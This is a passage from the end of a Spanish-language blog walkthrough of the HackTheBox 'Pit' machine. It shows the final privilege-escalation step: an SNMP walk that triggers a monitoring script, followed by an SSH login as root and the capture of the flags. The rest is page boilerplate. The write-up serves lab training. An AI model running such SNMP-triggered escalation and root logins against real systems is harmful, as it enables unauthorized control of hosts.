+-rwxrwxr-x. 1 michelle michelle 612 Jun 29 25:25 /usr/local/monitoring/checkea.sh
+</code></pre>
+
+<pre><code class="language-bash">❱ snmpbulkwalk -v2c -c public 10.10.10.241 iso
+</code></pre>
+
+<p>No vemos ningún problema (al parecer):</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346bash_snmpWalkbulk_ex_iso_scriptDone.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Intentamos ahora conectarnos por <strong>SSH</strong> pasándole nuestra llave privada como identificación:</p>
+
+<pre><code class="language-bash">❱ ssh root@10.10.10.241 -i ~/.ssh/id_rsa
+</code></pre>
+
+<p>Yyyyyyyyyyyyyyyyy…</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346bash_monitor_ssh_rootDone.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>TAMOOOOOOOOOOOOOOOOOOOOOOS DENTROOOOOOOOO DE LA MÁQUINAAAAAAAAAAAAA COMOOOO <strong>ROOOOOOT</strong>!!</p>
+
+<p>Veamos las flags…</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346flags.png" alt="346flags" /></p>
+
+<p>FIN!! NO VA MÁS!!</p>
+
+<p>…</p>
+
+<p>Dios, fue una máquina bastante, ihss, no sé, muy poco amigable jjaajaj, pero bueno, se aprendió, se hizo un lindo <strong>script</strong> y pensamos mucho lateralmente.</p>
+
+<p>La parte del script (privesc) fue algo extraña. Lo que me gusto es que todo lo que encontramos se usó, así que bien ahí!!</p>
+
+<p>Y bueno, nos leeremos en otros rincones de tu mente, descansa (de verdad) pero recuerda, a seguir ROMPIENDO todoooooooooooo!</p>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        Vacios
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=HackTheBox - Pit&url=http://localhost:4000/htb/pit" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/73707" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/lanzt" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+<!-- Related Posts
+================================================== -->
+<div class=" related-posts ">  
+
+    
+    <h2 class="text-center mb-4">Posts relacionados a este (o se hace el intento).</h2>
+    
+    
+    <div class="d-flex justify-content-center align-items-center">
+
+    <!-- Tags -->  
+    
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#CentOS">CentOS</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#DMS">DMS</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#SNMP">SNMP</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#SeedDMS">SeedDMS</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#cockpit">cockpit</a>               
+    
+    
+    <!-- Categories -->
+    
+    
+    <a class="smoothscroll badge badge-primary" href="/categories#htb">htb</a>                
+    
+
+    </div>
+
+    
+    
+    
+    <div class="blog-grid-container">
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/carrier">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155banner.png" alt="HackTheBox - Carrier"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/carrier">HackTheBox - Carrier</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Linux nivel medio. Enumeraremos bastante y leeremos más. Jugaremos con SNMP, inyección de comandos de un proceso en la web yyyyyy una locura llamada BGP Hijacking. Interceptaremos el tráfico...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">29 Jul 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        </div>        
+</div>
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+    </div>
+
+    
+    <!-- Newsletter
+    ================================================== -->
+    <div class="newsletter text-center">
+        <span class="h4"><img src="/assets/images/sh0x.png" class="newsletter-logo" alt="Sh0x blog"></span>
+        <p></p>
+    </div>
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-left">
+                Copyright © 2022 Sh0x blog 
+            </div>
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Memoirs Jekyll Theme</a> by WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+</body>
+</html>
